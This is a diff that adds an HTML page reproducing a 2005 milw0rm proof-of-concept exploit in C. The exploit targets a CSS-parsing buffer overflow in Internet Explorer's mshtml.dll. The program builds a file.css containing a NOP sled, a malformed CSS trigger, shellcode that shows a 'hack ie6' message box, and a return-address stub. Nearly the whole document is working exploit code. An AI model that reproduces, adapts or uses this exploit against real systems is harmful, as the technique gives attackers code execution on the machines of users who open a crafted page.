@@ -1,0 +1,95 @@
+<html>
+<head>
+<title>MS Internet Explorer "mshtml.dll" CSS Parsing Buffer Overflow</title>
+<pre>
+/* 
+Taken from http://www.securiteam.com/exploits/5NP042KF5A.html 
+
+The exploit will create a .CSS file that should be included 
+in an HTML file. When a user loads the HTML file, Internet 
+Explorer will try to parse the CSS and will trigger the 
+buffer overflow. 
+*/
+
+//Exploit Code:
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;tchar.h&gt;
+
+char bug[]=
+&quot;\x40\x63\x73\x73\x20\x6D\x6D\x7B\x49\x7B\x63\x6F\x6E\x74\x65\x6E\x74\x3A\x20\x22\x22\x3B\x2F&quot;
+&quot;\x2A\x22\x20\x22\x2A\x2F\x7D\x7D\x40\x6D\x3B\x40\x65\x6E\x64\x3B\x20\x2F\x2A\x22\x7D\x7D\x20\x20\x20&quot;;
+
+//////////////////////////////////////////////////////
+/*
+shellcode :MessageBox (0,&quot;hack ie6&quot;,0,MB_OK);
+-
+XOR EBX,EBX
+PUSH EBX ; 0
+PUSH EBX ; 0
+ADD AL,0F
+PUSH EAX ; Msg &quot; Hack ie6 &quot;
+PUSH EBX ;0
+JMP 746D8E72 ;USER32.MessageBoxA
+*/
+
+char shellcode[]= &quot;\x33\xDB\x53\x53\x04\x0F\x50\x53\xE9\xCB\x8D\x6D\x74&quot;
+&quot;\x90\x90\x48\x61\x63\x6B\x20\x69\x65\x36\x20\x63\x73\x73&quot;;
+
+
+////////////////////////////////////////////////////////
+// return address :: esp+1AC :: start shellcode
+//MOV EAX,ESP
+//ADD AX,1AC
+//CALL EAX
+
+char ret[]= &quot;\x8B\xC4\x66\x05\xAC\x01\xFF\xD0&quot;;
+
+int main(int argc, char* argv[])
+{
+
+    char buf[8192];
+    FILE *cssfile;
+    int i;
+
+    printf(&quot;\n\n Internet Explorer(mshtml.dll) , Cascading Style Sheets Exploit \n&quot;);
+    printf(&quot; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;);
+    printf(&quot; Coded by : Arabteam2000 \n&quot;);
+    printf(&quot; Web: www.arabteam2000.com \n&quot;);
+    printf(&quot; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n&quot;);
+
+        // NOP`s
+        for(i=0;i&lt;8192;i++)
+        buf[i]=0x90;
+
+
+                // bug
+        memcpy((void*)&amp;buf[0],
+                (void*)&amp;bug,48);
+
+        // shellcode
+        memcpy((void*)&amp;buf[100],
+                (void*)&amp;shellcode,27);
+
+        // ret address
+        memcpy((void*)&amp;buf[8182],
+                (void*)&amp;ret,8);
+
+
+        cssfile=fopen(&quot;file.css&quot;,&quot;w+b&quot;);
+        if(cssfile==NULL){
+                printf(&quot;-Error: fopen \n&quot;);
+        return 1;
+        }
+
+                fwrite(buf,8192,1,cssfile);
+        printf(&quot;-Created file: file.css\n ..OK\n\n&quot;);
+
+        fclose (cssfile);
+        return 0;
+}
+
+// milw0rm.com [2005-03-09]
+</pre>
+</html>
+
